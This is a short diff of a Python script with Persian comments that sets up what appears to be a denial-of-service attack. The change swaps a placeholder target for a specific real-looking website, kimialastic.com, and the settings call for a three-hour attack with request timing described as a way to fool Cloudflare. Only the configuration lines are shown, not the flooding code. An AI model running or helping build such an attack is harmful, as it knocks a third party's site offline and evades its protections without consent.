@@ -6,7 +6,7 @@ from queue import Queue
 from datetime import datetime, timedelta
 
 # تنظیمات اولیه
-target_url = "https://example.com"  # آدرس سایت هدف (اینو با آدرس خودت جایگزین کن)
+target_url = "https://kimialastic.com/"  # آدرس سایت هدف (اینو با آدرس خودت جایگزین کن)
 attack_duration_hours = 3  # مدت زمان اتک (به ساعت)
 attack_duration = attack_duration_hours * 60 * 60  # تبدیل به ثانیه
 request_interval = 1.0  # فاصله بین درخواست‌ها (ثانیه) برای گول زدن Cloudflare
